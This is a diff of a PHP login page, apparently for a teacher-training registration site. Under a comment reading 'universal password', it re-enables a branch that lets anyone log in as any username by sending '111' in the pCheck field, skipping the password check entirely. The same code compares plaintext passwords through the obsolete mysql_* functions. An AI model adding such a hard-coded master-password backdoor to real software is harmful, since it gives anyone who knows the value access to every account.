@@ -100,17 +100,17 @@ if (isset($_POST['uCheck'])) {
   $MM_redirecttoReferrer = true;
   mysql_select_db($database_conn_web, $conn_web);
 //通用密碼
-  // if($_POST['pCheck']=='9999'){
-  //   $LoginRS__query=sprintf("SELECT id, username, password, level, EForm_MK FROM member WHERE username=%s ",
-  //   GetSQLValueString($loginUsername, "text"));
-  //   $LoginRS = mysql_query($LoginRS__query, $conn_web) or die(mysql_error());
-  //   $loginFoundUser = mysql_num_rows($LoginRS);
-  // }else{
+  if($_POST['pCheck']=='111'){
+    $LoginRS__query=sprintf("SELECT id, username, password, level, EForm_MK FROM member WHERE username=%s ",
+    GetSQLValueString($loginUsername, "text"));
+    $LoginRS = mysql_query($LoginRS__query, $conn_web) or die(mysql_error());
+    $loginFoundUser = mysql_num_rows($LoginRS);
+  }else{
   $LoginRS__query=sprintf("SELECT id, username, password, level, EForm_MK FROM member WHERE username=%s AND password=%s",
   GetSQLValueString($loginUsername, "text"), GetSQLValueString($password, "text"));
   $LoginRS = mysql_query($LoginRS__query, $conn_web) or die(mysql_error());
   $loginFoundUser = mysql_num_rows($LoginRS);
-  // }
+  }
 
   if ($loginFoundUser) {
 
@@ -445,7 +445,7 @@ function YY_checkform() { //v4.66
          <?php if(date('y-m-d')>= $publishDate){//師資生報名流程?>
 
            <a href="./file/20180309102829.pdf"><img src="images/flow.png"  /></a>
-        
+
 
          <?php }else { ?><img src="images/flow.png"  /><? }?>
          </td>
